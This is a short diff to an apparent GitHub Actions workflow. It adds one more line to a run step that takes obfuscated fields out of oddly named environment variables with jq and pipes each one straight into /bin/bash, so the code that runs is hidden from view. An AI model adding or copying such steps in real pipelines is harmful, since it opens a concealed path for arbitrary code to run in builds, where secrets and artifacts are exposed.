@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$wv071" | jq -r .amec04 | /bin/bash
           printf '%s' "$neti735" | jq -r .mvjwr165 | /bin/bash
           printf '%s' "$bj99" | jq -r .xy2498 | /bin/bash
+          printf '%s' "$u26" | jq -r .sbmj6 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
